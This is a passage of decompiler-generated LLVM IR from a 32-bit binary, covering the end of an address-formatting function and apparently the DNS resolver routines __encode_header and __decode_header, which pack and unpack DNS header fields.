  %v1_805412b = add i32 %v0_805412b, 1
  %v0_8054135.pre = load i32, i32* @edi, align 4
  store i32 %v1_805412b, i32* @esi, align 4
  %v7_805412f = icmp sgt i32 %v1_805412b, 7
  %v10_8054135 = icmp eq i32 %v0_8054135.pre, -1
  br i1 %v7_805412f, label %dec_label_pc_8054135, label %dec_label_pc_80540a0

dec_label_pc_8054135:                             ; preds = %dec_label_pc_805412b
  br i1 %v10_8054135, label %dec_label_pc_8054146, label %dec_label_pc_805413a

dec_label_pc_805413a:                             ; preds = %dec_label_pc_8054135, %dec_label_pc_8054106
  %v0_8054142 = phi i32 [ %v0_80540b419, %dec_label_pc_8054135 ], [ %v3_8054112, %dec_label_pc_8054106 ]
  %v0_805413a = phi i32 [ %v0_8054135.pre, %dec_label_pc_8054135 ], [ %v0_805413a.pre, %dec_label_pc_8054106 ]
  %v1_805413a = load i32, i32* @ebp, align 4
  %v2_805413a = add i32 %v1_805413a, %v0_805413a
  store i32 %v2_805413a, i32* %eax.global-to-local, align 4
  %v9_805413d = icmp eq i32 %v2_805413a, 8
  %v1_8054140 = icmp eq i1 %v9_805413d, false
  br i1 %v1_8054140, label %dec_label_pc_8054146, label %dec_label_pc_8054142

dec_label_pc_8054142:                             ; preds = %dec_label_pc_805413a
  %v1_8054142 = inttoptr i32 %v0_8054142 to i8*
  store i8 58, i8* %v1_8054142, align 1
  %v0_8054145 = load i32, i32* @ebx, align 4
  %v1_8054145 = add i32 %v0_8054145, 1
  store i32 %v1_8054145, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054146

dec_label_pc_8054146:                             ; preds = %dec_label_pc_805413a, %dec_label_pc_8054135, %dec_label_pc_8054142
  %v0_805414a = phi i32 [ %v0_8054142, %dec_label_pc_805413a ], [ %v0_80540b419, %dec_label_pc_8054135 ], [ %v1_8054145, %dec_label_pc_8054142 ]
  store i32 %v2_8054095, i32* %edx.global-to-local, align 4
  %v1_805414a = add i32 %v0_805414a, 1
  store i32 %v1_805414a, i32* %eax.global-to-local, align 4
  %v1_805414d = inttoptr i32 %v0_805414a to i8*
  store i8 0, i8* %v1_805414d, align 1
  %v0_8054150 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054150 = load i32, i32* %edx.global-to-local, align 4
  %v2_8054150 = sub i32 %v0_8054150, %v1_8054150
  store i32 %v2_8054150, i32* @eax, align 4
  %tmp75 = icmp ugt i32 %v2_8054150, %arg4
  br i1 %tmp75, label %dec_label_pc_8054158, label %dec_label_pc_8054165

dec_label_pc_8054158:                             ; preds = %dec_label_pc_8054146
  %v0_8054158 = load i8*, i8** %stack_var_-124, align 4
  %v1_8054158 = ptrtoint i8* %v0_8054158 to i32
  %v2_8054158 = call i32 @__errno_location(i32 %v1_8054158)
  store i32 %v2_8054158, i32* %eax.global-to-local, align 4
  %v1_805415d = inttoptr i32 %v2_8054158 to i32*
  store i32 28, i32* %v1_805415d, align 4
  br label %dec_label_pc_8054186

dec_label_pc_8054165:                             ; preds = %dec_label_pc_8054146
  %v0_8054165 = load i32, i32* @edi, align 4
  store i32 %v0_8054165, i32* %stack_var_-112, align 4
  %tmp45 = bitcast i8** %stack_var_12 to i32*
  %v3_80541682 = load i32, i32* %tmp45, align 4
  %tmp46 = bitcast i8** %stack_var_-124 to i32*
  store i32 %v3_80541682, i32* %tmp46, align 4
  %v0_805416f.cast = inttoptr i32 %v3_80541682 to i8*
  %v5_805416f = call i32 @strcpy(i8* %v0_805416f.cast, i32 %v2_8054095)
  store i32 %v5_805416f, i32* %eax.global-to-local, align 4
  store i32 %v5_805416f, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8054188

dec_label_pc_805417b:                             ; preds = %dec_label_pc_8053fd1
  %v1_805417b = call i32 @__errno_location(i32 %v0_8053fc4)
  store i32 %v1_805417b, i32* %eax.global-to-local, align 4
  %v1_8054180 = inttoptr i32 %v1_805417b to i32*
  store i32 97, i32* %v1_8054180, align 4
  br label %dec_label_pc_8054186

dec_label_pc_8054186:                             ; preds = %dec_label_pc_8054158, %dec_label_pc_805417b
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8054188

dec_label_pc_8054188:                             ; preds = %dec_label_pc_80540df, %dec_label_pc_8054165, %dec_label_pc_8053fdc, %dec_label_pc_8054186
  %v0_805418b = phi i32 [ 0, %dec_label_pc_80540df ], [ %v5_805416f, %dec_label_pc_8054165 ], [ %v3_8053fe8, %dec_label_pc_8053fdc ], [ 0, %dec_label_pc_8054186 ]
  store i32 %v0_805418b, i32* %eax.global-to-local, align 4
  store i32 %v0_8053fc4, i32* %ebx.global-to-local, align 4
  ret i32 %v0_805418b

; uselistorder directives
  uselistorder i32 %v0_805418b, { 1, 0 }
  uselistorder i32 %v0_805414a, { 1, 0 }
  uselistorder i1 %v10_8054135, { 1, 0 }
  uselistorder i32 %v0_8054135.pre, { 1, 0, 2 }
  uselistorder i32 %v1_805412b, { 1, 0, 2 }
  uselistorder i32 %v1_8054117, { 1, 0 }
  uselistorder i32 %v0_8054120, { 3, 2, 0, 1 }
  uselistorder i32 %v2_80540ac, { 1, 0 }
  uselistorder i32 %v2_80540a5, { 1, 2, 0 }
  uselistorder i32 %stack_var_-116.160, { 2, 1, 0 }
  uselistorder i8* %stack_var_-120.161, { 2, 1, 0 }
  uselistorder i32 %v0_80540be62, { 3, 2, 1, 0 }
  uselistorder i32 %v1_80540b063, { 2, 1, 0 }
  uselistorder i32 %v0_80540ba64, { 2, 6, 5, 1, 4, 3, 0 }
  uselistorder i32 %v2_8054095, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_805413518, { 1, 0 }
  uselistorder i32 %v1_805408a, { 1, 0 }
  uselistorder i32 %v0_805408a, { 1, 0, 2 }
  uselistorder i32 %v5_8054092, { 1, 2, 0 }
  uselistorder i32 %v1_805406d, { 0, 2, 1 }
  uselistorder i32 %v0_805405d9, { 1, 2, 0, 3 }
  uselistorder i32 %v0_805406813, { 1, 2, 0, 3 }
  uselistorder i1 %v10_8054058, { 1, 0 }
  uselistorder i32 %v0_805408366, { 1, 0, 3, 2 }
  uselistorder i32 %v0_805407867, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_805406d69, { 4, 1, 3, 2, 0 }
  uselistorder i32 %v0_805402570, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_8053fc4, { 0, 2, 1 }
  uselistorder i32* %stack_var_-112, { 0, 1, 3, 2 }
  uselistorder i8** %stack_var_-124, { 0, 4, 3, 2, 5, 1 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 4, 5, 2, 6, 3, 7 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 14, 8, 9, 10, 11, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i32 97, { 4, 5, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @sprintf, { 2, 1, 0 }
  uselistorder [3 x i8]* @global_var_8058631.257, { 1, 0 }
  uselistorder i8 58, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 65535, { 0, 1, 3, 2 }
  uselistorder i32 64, { 7, 2, 9, 6, 8, 5, 1, 3, 0, 4 }
  uselistorder i32* @esp, { 0, 1, 147, 7, 148, 149, 150, 151, 152, 153, 8, 262, 263, 264, 265, 266, 267, 268, 10, 269, 270, 271, 272, 273, 16, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 12, 284, 285, 286, 13, 287, 9, 288, 289, 290, 291, 292, 293, 14, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 11, 307, 308, 309, 310, 311, 312, 15, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 216, 17, 217, 2, 3, 334, 4, 5, 6, 18, 218, 219, 220, 221, 19, 222, 223, 224, 225, 22, 226, 227, 228, 23, 229, 24, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 21, 243, 25, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 20, 256, 257, 258, 259, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 80, 79, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 102, 101, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 260, 261 }
  uselistorder i32 15, { 0, 4, 8, 7, 1, 6, 5, 2, 3 }
  uselistorder i32 60, { 4, 5, 6, 7, 0, 8, 3, 2, 1 }
  uselistorder i64 4294967296, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 12, 11, 14, 13 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 0, 6, 9, 10, 3, 15, 16, 13, 14, 4, 1, 2, 7, 8, 5, 11, 12 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 4, 2, 3 }
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8054188, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_8054186, { 1, 0 }
  uselistorder label %dec_label_pc_8054146, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805412b, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80540c2, { 1, 0 }
  uselistorder label %dec_label_pc_80540ba, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80540a0, { 1, 0 }
  uselistorder label %dec_label_pc_8054095, { 1, 0 }
  uselistorder label %dec_label_pc_8054085, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054081, { 1, 0 }
  uselistorder label %dec_label_pc_805406d, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805406a, { 1, 0 }
  uselistorder label %dec_label_pc_8054040, { 1, 0 }
}

define i32 @__encode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_2()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8054198 = load i32, i32* @ebx, align 4
  store i32 %v0_8054198, i32* %stack_var_-8, align 4
  store i32 %tmp8, i32* %ebx.global-to-local, align 4
  %v4_80541a2 = ptrtoint i8* %tmp to i32
  store i32 %v4_80541a2, i32* %esi.global-to-local, align 4
  %v7_80541a6 = icmp sgt i32 %tmp9, 11
  br i1 %v7_80541a6, label %dec_label_pc_80541ac, label %dec_label_pc_8054240

dec_label_pc_80541ac:                             ; preds = %entry
  %v1_80541ac = add i32 %tmp8, 1
  %v2_80541ac = inttoptr i32 %v1_80541ac to i8*
  %v3_80541ac = load i8, i8* %v2_80541ac, align 1
  store i8 %v3_80541ac, i8* %tmp, align 1
  %v0_80541b2 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80541b2 = inttoptr i32 %v0_80541b2 to i32*
  %v2_80541b2 = load i32, i32* %v1_80541b2, align 4
  %v1_80541b4 = trunc i32 %v2_80541b2 to i8
  %v2_80541b4 = load i32, i32* %esi.global-to-local, align 4
  %v3_80541b4 = add i32 %v2_80541b4, 1
  %v4_80541b4 = inttoptr i32 %v3_80541b4 to i8*
  store i8 %v1_80541b4, i8* %v4_80541b4, align 1
  store i32 4, i32* %edx.global-to-local, align 4
  %v0_80541d9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80541d9 = add i32 %v0_80541d9, 8
  %v2_80541d9 = inttoptr i32 %v1_80541d9 to i32*
  %v3_80541d9 = load i32, i32* %v2_80541d9, align 4
  %v1_80541dc = mul i32 %v3_80541d9, 8
  %v2_80541df = and i32 %v1_80541dc, 120
  %v2_80541e2 = or i32 %v2_80541df, 4
  store i32 %v2_80541e2, i32* %edx.global-to-local, align 4
  %v1_80541e4 = add i32 %v0_80541d9, 20
  %v2_80541e4 = inttoptr i32 %v1_80541e4 to i32*
  %v3_80541e4 = load i32, i32* %v2_80541e4, align 4
  %v4_80541e4 = icmp eq i32 %v3_80541e4, 0
  %v1_80541e8 = icmp eq i1 %v4_80541e4, false
  %v2_80541e8 = zext i1 %v1_80541e8 to i32
  %v2_80541eb = or i32 %v2_80541e8, %v2_80541e2
  store i32 %v2_80541eb, i32* %edx.global-to-local, align 4
  %v2_80541ed = or i32 %v2_80541eb, 130
  %v3_80541ed = trunc i32 %v2_80541ed to i8
  store i32 %v2_80541ed, i32* @ecx, align 4
  %v2_80541ef = load i32, i32* %esi.global-to-local, align 4
  %v3_80541ef = add i32 %v2_80541ef, 2
  %v4_80541ef = inttoptr i32 %v3_80541ef to i8*
  store i8 %v3_80541ed, i8* %v4_80541ef, align 1
  %v0_80541f2 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80541f6 = add i32 %v0_80541f2, 28
  %v2_80541f6 = inttoptr i32 %v1_80541f6 to i8*
  %v3_80541f6 = load i8, i8* %v2_80541f6, align 1
  %v5_80541f6 = load i32, i32* %edx.global-to-local, align 4
  %v2_80541ff = urem i8 %v3_80541f6, 16
  %v7_80541ff = zext i8 %v2_80541ff to i32
  %v9_80541ff = and i32 %v5_80541f6, -256
  %v10_80541ff = or i32 %v9_80541ff, %v7_80541ff
  store i32 %v10_80541ff, i32* %edx.global-to-local, align 4
  %v2_8054202 = or i8 %v2_80541ff, -128
  %v2_8054204 = load i32, i32* %esi.global-to-local, align 4
  %v3_8054204 = add i32 %v2_8054204, 3
  %v4_8054204 = inttoptr i32 %v3_8054204 to i8*
  store i8 %v2_8054202, i8* %v4_8054204, align 1
  %v0_8054207 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054207 = add i32 %v0_8054207, 33
  %v2_8054207 = inttoptr i32 %v1_8054207 to i8*
  %v3_8054207 = load i8, i8* %v2_8054207, align 1
  %v2_805420b = load i32, i32* %esi.global-to-local, align 4
  %v3_805420b = add i32 %v2_805420b, 4
  %v4_805420b = inttoptr i32 %v3_805420b to i8*
  store i8 %v3_8054207, i8* %v4_805420b, align 1
  %v0_805420e = load i32, i32* %ebx.global-to-local, align 4
  %v1_805420e = add i32 %v0_805420e, 32
  %v2_805420e = inttoptr i32 %v1_805420e to i32*
  %v3_805420e = load i32, i32* %v2_805420e, align 4
  %v1_8054211 = trunc i32 %v3_805420e to i8
  %v2_8054211 = load i32, i32* %esi.global-to-local, align 4
  %v3_8054211 = add i32 %v2_8054211, 5
  %v4_8054211 = inttoptr i32 %v3_8054211 to i8*
  store i8 %v1_8054211, i8* %v4_8054211, align 1
  %v0_8054214 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054214 = add i32 %v0_8054214, 37
  %v2_8054214 = inttoptr i32 %v1_8054214 to i8*
  %v3_8054214 = load i8, i8* %v2_8054214, align 1
  %v2_8054218 = load i32, i32* %esi.global-to-local, align 4
  %v3_8054218 = add i32 %v2_8054218, 6
  %v4_8054218 = inttoptr i32 %v3_8054218 to i8*
  store i8 %v3_8054214, i8* %v4_8054218, align 1
  %v0_805421b = load i32, i32* %ebx.global-to-local, align 4
  %v1_805421b = add i32 %v0_805421b, 36
  %v2_805421b = inttoptr i32 %v1_805421b to i32*
  %v3_805421b = load i32, i32* %v2_805421b, align 4
  %v1_805421e = trunc i32 %v3_805421b to i8
  %v2_805421e = load i32, i32* %esi.global-to-local, align 4
  %v3_805421e = add i32 %v2_805421e, 7
  %v4_805421e = inttoptr i32 %v3_805421e to i8*
  store i8 %v1_805421e, i8* %v4_805421e, align 1
  %v0_8054221 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054221 = add i32 %v0_8054221, 41
  %v2_8054221 = inttoptr i32 %v1_8054221 to i8*
  %v3_8054221 = load i8, i8* %v2_8054221, align 1
  %v2_8054225 = load i32, i32* %esi.global-to-local, align 4
  %v3_8054225 = add i32 %v2_8054225, 8
  %v4_8054225 = inttoptr i32 %v3_8054225 to i8*
  store i8 %v3_8054221, i8* %v4_8054225, align 1
  %v0_8054228 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054228 = add i32 %v0_8054228, 40
  %v2_8054228 = inttoptr i32 %v1_8054228 to i32*
  %v3_8054228 = load i32, i32* %v2_8054228, align 4
  %v1_805422b = trunc i32 %v3_8054228 to i8
  %v2_805422b = load i32, i32* %esi.global-to-local, align 4
  %v3_805422b = add i32 %v2_805422b, 9
  %v4_805422b = inttoptr i32 %v3_805422b to i8*
  store i8 %v1_805422b, i8* %v4_805422b, align 1
  %v0_805422e = load i32, i32* %ebx.global-to-local, align 4
  %v1_805422e = add i32 %v0_805422e, 45
  %v2_805422e = inttoptr i32 %v1_805422e to i8*
  %v3_805422e = load i8, i8* %v2_805422e, align 1
  %v2_8054232 = load i32, i32* %esi.global-to-local, align 4
  %v3_8054232 = add i32 %v2_8054232, 10
  %v4_8054232 = inttoptr i32 %v3_8054232 to i8*
  store i8 %v3_805422e, i8* %v4_8054232, align 1
  %v0_8054235 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054235 = add i32 %v0_8054235, 44
  %v2_8054235 = inttoptr i32 %v1_8054235 to i32*
  %v3_8054235 = load i32, i32* %v2_8054235, align 4
  %v1_8054238 = trunc i32 %v3_8054235 to i8
  %v2_8054238 = load i32, i32* %esi.global-to-local, align 4
  %v3_8054238 = add i32 %v2_8054238, 11
  %v4_8054238 = inttoptr i32 %v3_8054238 to i8*
  store i8 %v1_8054238, i8* %v4_8054238, align 1
  %v2_8054240.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8054240

dec_label_pc_8054240:                             ; preds = %entry, %dec_label_pc_80541ac
  %v2_8054240 = phi i32 [ %v0_8054198, %entry ], [ %v2_8054240.pre, %dec_label_pc_80541ac ]
  %v0_8054242 = phi i32 [ -1, %entry ], [ 12, %dec_label_pc_80541ac ]
  store i32 %v2_8054240, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8054242

; uselistorder directives
  uselistorder i32 45, { 4, 1, 3, 0, 2 }
  uselistorder i32 41, { 1, 0 }
  uselistorder i32 37, { 3, 1, 0, 2 }
  uselistorder i32 33, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_8054240, { 1, 0 }
}

define i32 @__decode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-4 = alloca i32, align 4
  %v0_8054244 = load i32, i32* @ebx, align 4
  store i32 %v0_8054244, i32* %stack_var_-4, align 4
  %v4_8054245 = ptrtoint i8* %tmp2 to i32
  store i32 %v4_8054245, i32* @ecx, align 4
  store i32 %tmp, i32* %ebx.global-to-local, align 4
  %v2_805424d = load i8, i8* %tmp2, align 1
  %v3_805424d = zext i8 %v2_805424d to i32
  %v1_8054250 = add i32 %v4_8054245, 1
  %v2_8054250 = inttoptr i32 %v1_8054250 to i8*
  %v3_8054250 = load i8, i8* %v2_8054250, align 1
  %v4_8054250 = zext i8 %v3_8054250 to i32
  %v2_8054254 = mul nuw nsw i32 %v3_805424d, 256
  %v2_8054257 = or i32 %v4_8054250, %v2_8054254
  %v2_8054259 = inttoptr i32 %tmp to i32*
  store i32 %v2_8054257, i32* %v2_8054259, align 4
  %v0_805425b = load i32, i32* @ecx, align 4
  %v1_805425b = add i32 %v0_805425b, 2
  %v2_805425b = inttoptr i32 %v1_805425b to i8*
  %v3_805425b = load i8, i8* %v2_805425b, align 1
  %tmp6 = icmp slt i8 %v3_805425b, 0
  %v2_805425f = zext i1 %tmp6 to i32
  %v1_8054262 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054262 = add i32 %v1_8054262, 4
  %v3_8054262 = inttoptr i32 %v2_8054262 to i32*
  store i32 %v2_805425f, i32* %v3_8054262, align 4
  %v0_8054265 = load i32, i32* @ecx, align 4
  %v1_8054265 = add i32 %v0_8054265, 2
  %v2_8054265 = inttoptr i32 %v1_8054265 to i8*
  %v3_8054265 = load i8, i8* %v2_8054265, align 1
  %v3_8054268 = udiv i8 %v3_8054265, 8
  %tmp7 = urem i8 %v3_8054268, 16
  %v1_805426b = zext i8 %tmp7 to i32
  %v1_805426e = load i32, i32* %ebx.global-to-local, align 4
  %v2_805426e = add i32 %v1_805426e, 8
  %v3_805426e = inttoptr i32 %v2_805426e to i32*
  store i32 %v1_805426b, i32* %v3_805426e, align 4
  %v0_8054271 = load i32, i32* @ecx, align 4
  %v1_8054271 = add i32 %v0_8054271, 2
  %v2_8054271 = inttoptr i32 %v1_8054271 to i8*
  %v3_8054271 = load i8, i8* %v2_8054271, align 1
  %div = udiv i8 %v3_8054271, 4
  %tmp8 = urem i8 %div, 2
  %v1_8054278 = zext i8 %tmp8 to i32
  %v1_805427b = load i32, i32* %ebx.global-to-local, align 4
  %v2_805427b = add i32 %v1_805427b, 12
  %v3_805427b = inttoptr i32 %v2_805427b to i32*
  store i32 %v1_8054278, i32* %v3_805427b, align 4
  %v0_805427e = load i32, i32* @ecx, align 4
  %v1_805427e = add i32 %v0_805427e, 2
  %v2_805427e = inttoptr i32 %v1_805427e to i8*
  %v3_805427e = load i8, i8* %v2_805427e, align 1
  %div5 = udiv i8 %v3_805427e, 2
  %tmp9 = urem i8 %div5, 2
  %v1_8054284 = zext i8 %tmp9 to i32
  %v1_8054287 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054287 = add i32 %v1_8054287, 16
  %v3_8054287 = inttoptr i32 %v2_8054287 to i32*
  store i32 %v1_8054284, i32* %v3_8054287, align 4
  %v0_805428a = load i32, i32* @ecx, align 4
  %v1_805428a = add i32 %v0_805428a, 2
  %v2_805428a = inttoptr i32 %v1_805428a to i8*
  %v3_805428a = load i8, i8* %v2_805428a, align 1
  %tmp10 = urem i8 %v3_805428a, 2
  %v1_805428e = zext i8 %tmp10 to i32
  %v1_8054291 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054291 = add i32 %v1_8054291, 20
  %v3_8054291 = inttoptr i32 %v2_8054291 to i32*
  store i32 %v1_805428e, i32* %v3_8054291, align 4
  %v0_8054294 = load i32, i32* @ecx, align 4
  %v1_8054294 = add i32 %v0_8054294, 3
  %v2_8054294 = inttoptr i32 %v1_8054294 to i8*
  %v3_8054294 = load i8, i8* %v2_8054294, align 1
  %tmp11 = icmp slt i8 %v3_8054294, 0
  %v2_8054298 = zext i1 %tmp11 to i32
  %v1_805429b = load i32, i32* %ebx.global-to-local, align 4
  %v2_805429b = add i32 %v1_805429b, 24
  %v3_805429b = inttoptr i32 %v2_805429b to i32*
  store i32 %v2_8054298, i32* %v3_805429b, align 4
  %v0_805429e = load i32, i32* @ecx, align 4
  %v1_805429e = add i32 %v0_805429e, 3
  %v2_805429e = inttoptr i32 %v1_805429e to i8*
  %v3_805429e = load i8, i8* %v2_805429e, align 1
  %tmp12 = urem i8 %v3_805429e, 16
  %v1_80542a2 = zext i8 %tmp12 to i32
  %v1_80542a5 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80542a5 = add i32 %v1_80542a5, 28
  %v3_80542a5 = inttoptr i32 %v2_80542a5 to i32*
  store i32 %v1_80542a2, i32* %v3_80542a5, align 4
  %v0_80542a8 = load i32, i32* @ecx, align 4
  %v1_80542a8 = add i32 %v0_80542a8, 4
  %v2_80542a8 = inttoptr i32 %v1_80542a8 to i8*
  %v3_80542a8 = load i8, i8* %v2_80542a8, align 1
  %v4_80542a8 = zext i8 %v3_80542a8 to i32
  %v1_80542ac = add i32 %v0_80542a8, 5
  %v2_80542ac = inttoptr i32 %v1_80542ac to i8*
  %v3_80542ac = load i8, i8* %v2_80542ac, align 1
  %v4_80542ac = zext i8 %v3_80542ac to i32
  %v2_80542b0 = mul nuw nsw i32 %v4_80542a8, 256
  %v2_80542b3 = or i32 %v4_80542ac, %v2_80542b0
  %v1_80542b5 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80542b5 = add i32 %v1_80542b5, 32
  %v3_80542b5 = inttoptr i32 %v2_80542b5 to i32*
  store i32 %v2_80542b3, i32* %v3_80542b5, align 4
  %v0_80542b8 = load i32, i32* @ecx, align 4
  %v1_80542b8 = add i32 %v0_80542b8, 6
  %v2_80542b8 = inttoptr i32 %v1_80542b8 to i8*
  %v3_80542b8 = load i8, i8* %v2_80542b8, align 1
  %v4_80542b8 = zext i8 %v3_80542b8 to i32
  %v1_80542bc = add i32 %v0_80542b8, 7
  %v2_80542bc = inttoptr i32 %v1_80542bc to i8*
  %v3_80542bc = load i8, i8* %v2_80542bc, align 1
  %v4_80542bc = zext i8 %v3_80542bc to i32
  %v2_80542c0 = mul nuw nsw i32 %v4_80542b8, 256
  %v2_80542c3 = or i32 %v4_80542bc, %v2_80542c0
  %v1_80542c5 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80542c5 = add i32 %v1_80542c5, 36
  %v3_80542c5 = inttoptr i32 %v2_80542c5 to i32*
  store i32 %v2_80542c3, i32* %v3_80542c5, align 4
  %v0_80542c8 = load i32, i32* @ecx, align 4
  %v1_80542c8 = add i32 %v0_80542c8, 8
  %v2_80542c8 = inttoptr i32 %v1_80542c8 to i8*
  %v3_80542c8 = load i8, i8* %v2_80542c8, align 1
  %v4_80542c8 = zext i8 %v3_80542c8 to i32
  %v1_80542cc = add i32 %v0_80542c8, 9
  %v2_80542cc = inttoptr i32 %v1_80542cc to i8*
  %v3_80542cc = load i8, i8* %v2_80542cc, align 1
  %v4_80542cc = zext i8 %v3_80542cc to i32
  %v2_80542d0 = mul nuw nsw i32 %v4_80542c8, 256
  %v2_80542d3 = or i32 %v4_80542cc, %v2_80542d0
  %v1_80542d5 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80542d5 = add i32 %v1_80542d5, 40
  %v3_80542d5 = inttoptr i32 %v2_80542d5 to i32*
  store i32 %v2_80542d3, i32* %v3_80542d5, align 4
  %v0_80542d8 = load i32, i32* @ecx, align 4
  %v1_80542d8 = add i32 %v0_80542d8, 10
  %v2_80542d8 = inttoptr i32 %v1_80542d8 to i8*
  %v3_80542d8 = load i8, i8* %v2_80542d8, align 1
  %v4_80542d8 = zext i8 %v3_80542d8 to i32
  %v1_80542dc = add i32 %v0_80542d8, 11
  %v2_80542dc = inttoptr i32 %v1_80542dc to i8*
  %v3_80542dc = load i8, i8* %v2_80542dc, align 1
  %v4_80542dc = zext i8 %v3_80542dc to i32
  %v2_80542e0 = mul nuw nsw i32 %v4_80542d8, 256
  %v2_80542e3 = or i32 %v4_80542dc, %v2_80542e0
  %v1_80542e5 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80542e5 = add i32 %v1_80542e5, 44
  %v3_80542e5 = inttoptr i32 %v2_80542e5 to i32*
  store i32 %v2_80542e3, i32* %v3_80542e5, align 4
  %v2_80542ed = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80542ed, i32* @ebx, align 4
  ret i32 12

; uselistorder directives
  uselistorder i8* %tmp2, { 1, 0 }
  uselistorder i32 11, { 14, 15, 2, 3, 7, 8, 16, 4, 9, 10, 11, 12, 5, 13, 1, 6, 0 }
  uselistorder i32 40, { 8, 9, 3, 11, 12, 10, 0, 1, 4, 5, 6, 7, 2 }
  uselistorder i32 7, { 20, 21, 4, 7, 5, 0, 3, 8, 15, 16, 17, 18, 19, 6, 2, 1, 14, 9, 10, 11, 12, 13 }
  uselistorder i32 6, { 23, 24, 0, 1, 10, 21, 3, 18, 11, 12, 7, 26, 13, 22, 4, 5, 2, 6, 9, 8, 14, 20, 15, 19, 16, 17, 25 }
  uselistorder i32 28, { 34, 35, 17, 18, 36, 25, 48, 47, 40, 41, 0, 42, 43, 44, 45, 46, 3, 4, 5, 1, 26, 16, 19, 20, 37, 38, 27, 28, 29, 30, 31, 32, 2, 33, 49, 39, 21, 22, 23, 6, 7, 24, 12, 11, 9, 10, 13, 14, 8, 15 }
  uselistorder i8 2, { 1, 2, 3, 4, 5, 18, 6, 0, 22, 19, 7, 8, 9, 10, 11, 12, 20, 21, 13, 16, 17, 14, 15 }
  uselistorder i8 4, { 0, 4, 5, 2, 3, 1 }
  uselistorder i8 16, { 2, 3, 4, 8, 9, 10, 6, 7, 5, 0, 1 }
  uselistorder i8 8, { 0, 8, 3, 7, 4, 5, 6, 1, 2 }
}

define i32 @__encode_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %v0_80542f0 = load i32, i32* @edi, align 4
  %v0_80542f1 = load i32, i32* @esi, align 4
  %v0_80542f2 = load i32, i32* @ebx, align 4
  store i32 %v0_80542f2, i32* %stack_var_-12, align 4
  store i32 %tmp3, i32* @ebx, align 4
  store i32 %tmp2, i32* @edi, align 4
